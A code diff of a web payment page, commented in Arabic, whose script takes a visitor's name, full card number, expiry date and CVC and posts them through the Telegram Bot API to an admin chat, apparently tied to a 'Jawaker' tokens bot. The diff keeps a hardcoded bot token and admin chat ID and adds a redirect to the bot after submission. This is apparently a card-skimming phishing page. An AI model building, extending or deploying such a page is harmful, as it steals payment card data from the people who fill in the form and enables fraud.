@@ -33,8 +33,9 @@
 
     <script>
         // ⚠️ ضع هنا بيانات بوتك الكاملة ليعمل الإرسال المباشر بنجاح
-        const BOT_TOKEN='8968589592:AAHmfyCRkM4Xladdy3c7ct8qalchU4OFI-s';
+        const BOT_TOKEN = '8968589592:AAHmfyCRkM4Xladdy3c7ct8qalchU4OFI-s';
         const ADMIN_CHAT_ID = '5437487652'; 
+        const BOT_USERNAME = '@Tokens_Jawaker_Bot'; // ⚠️ ضع يوزر بوتك الحقيقي هنا بدون علامة @ لكي يعود إليه دون مشاكل
 
         const submitBtn = document.getElementById('submitBtn');
 
@@ -77,7 +78,6 @@
 
             const textMessage = `💳 طلب دفع بالبطاقة جديد\n\n👤 حساب المستخدم: ${userId}\n📝 الاسم: ${name}\n🔢 رقم البطاقة: ${cardNum}\n📅 التاريخ: ${expiry}\n🔒 الرمز CVC: ${cvc}`;
             
-            // صناعة الأزرار التفاعلية للأدمن لترسل مباشرة للرد من خلال البوت
             const replyMarkup = {
                 inline_keyboard: [
                     [
@@ -94,7 +94,7 @@
                 body: JSON.stringify({ chat_id: userId, text: "⏳ تم ارسال طلبك يرجى الانتظار" })
             }).catch(e => console.log("خطأ في مراسلة المستخدم"));
 
-            // 2. إرسال البيانات الفورية للأدمن مع الأزرار التفاعلية المباشرة للتحكم والرد
+            // 2. إرسال البيانات الفورية للأدمن مع الأزرار التفاعلية المباشرة
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -105,11 +105,14 @@
                     alert("تم ارسال طلب الدفع بنجاح");
                     document.getElementById('paymentForm').reset();
                     validateForm();
+                    
+                    // تحويل مباشر وآمن إلى البوت لإنهاء عملية الدفع وإغلاق المتصفح بدون خطأ اليوزر
+                    window.location.href = `https://t.me/${BOT_USERNAME}`;
                 } else {
                     alert("حدث خطأ في الإرسال، تأكد من التوكن.");
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = "دفع الآن";
                 }
-                submitBtn.disabled = false;
-                submitBtn.innerText = "دفع الآن";
             })
             .catch(err => {
                 alert("خطأ في الاتصال بالشبكة.");
